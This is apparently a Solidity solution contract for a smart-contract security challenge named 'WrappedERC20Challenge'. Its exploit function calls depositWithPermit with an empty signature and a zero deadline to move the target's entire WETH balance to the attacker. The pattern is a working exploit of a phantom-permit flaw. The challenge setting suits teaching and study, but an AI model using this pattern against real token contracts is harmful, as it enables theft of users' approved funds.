// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IWrappedERC20Challenge {
    function WETH() external returns (IWETHMock);

    function wwETH() external returns (IWrappedERC20);
}

interface IWrappedERC20 {
    function depositWithPermit(
        address target,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address to
    ) external returns (uint256);
}

interface IWETHMock {
    function withdraw() external;

    function balanceOf(address) external returns (uint256);
}

contract ExploitWrappedERC20Challenge {
    address private owner;
    IWrappedERC20Challenge private immutable target;
    IWETHMock private immutable WrappedETH;
    IWrappedERC20 private immutable WrappedERC20;

    constructor(address _target) {
        target = IWrappedERC20Challenge(_target);
        WrappedETH = target.WETH();
        WrappedERC20 = target.wwETH();
        owner = msg.sender;
    }

    function exploit() public {
        WrappedERC20.depositWithPermit(
            address(target),
            WrappedETH.balanceOf(address(target)),
            0,
            0,
            "",
            "",
            owner
        );
    }
}
